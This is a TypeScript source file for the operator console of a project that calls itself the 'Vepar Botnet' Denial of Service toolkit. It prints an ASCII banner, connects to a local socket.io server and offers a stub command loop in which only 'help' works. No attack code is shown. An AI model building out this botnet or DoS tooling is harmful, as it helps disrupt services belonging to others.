import { Socket, io } from "socket.io-client";
import { Console } from "./Console";
import { Logger } from "./Logger";
import * as readline from 'readline';

const socket: Socket = io('http://localhost:3000');

export const colors = {
    Black: '\x1b[0;30m',
    Red: '\x1b[0;91m',
    Green: '\x1b[0;32m',
    Yellow: '\x1b[0;33m',
    Blue: '\x1b[0;34m',
    Purple: '\x1b[0;95m',
    Cyan: '\x1b[0;36m',
    White: '\x1b[0;37m',
    Reset: '\x1b[0m'

}

const printAscii = () => {
    console.log(String.raw`
${colors.Red}      ______________________________${colors.Cyan}    . \  | / .
${colors.Red}     /                            / \ ${colors.Cyan}    \ \ / /
${colors.Red}    |         ${colors.Purple}Vepar Botnet${colors.Red}       | ${colors.Cyan}==========  - -
${colors.Red}     \____________________________\_/${colors.Cyan}     / / \ \
${colors.Red}  ______________________________      \  | / | \
${colors.Red} /                            / \ ${colors.Cyan}    \ \ / /.   .
${colors.Red}|     ${colors.Purple}Made by UsboKirishima${colors.Red}  | ${colors.Cyan}==========  - -
${colors.Red} \____________________________\_/${colors.Cyan}     / / \ \    /
${colors.Red}      ______________________________   / |\  | /  .
${colors.Red}     /                            / \ ${colors.Cyan}    \ \ / /
${colors.Red}    |  ${colors.Purple}Denial of Service toolkit${colors.Red} | ${colors.Cyan}==========  -  - -
${colors.Red}     \____________________________\_/${colors.Cyan}     / / \ \
                                        .  / | \  .        
`)
}

enum Commands {
    back = 'back',
    help = 'help',
    credits = 'credits',
    ping = 'ping'
}

const helpMenu = () => {
    console.log(String.raw`
______________________________

 - ${colors.Blue}${Commands.back}${colors.Reset}
 - ${colors.Blue}${Commands.help}${colors.Reset}
 - ${colors.Blue}${Commands.credits}${colors.Reset}
 - ${colors.Blue}${Commands.ping}${colors.Reset}
    `)
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const inputLoop = () => {
    rl.question('> ', (command) => {
        if(command.trim().toLowerCase() == 'help') helpMenu();
        inputLoop();
    });
}

(async () => {
    console.clear();
    printAscii();
    const vpconsole = new Console(socket);
    Logger.log('Welcome to Vepar!\nGetting started using `help` command')
    inputLoop();
})();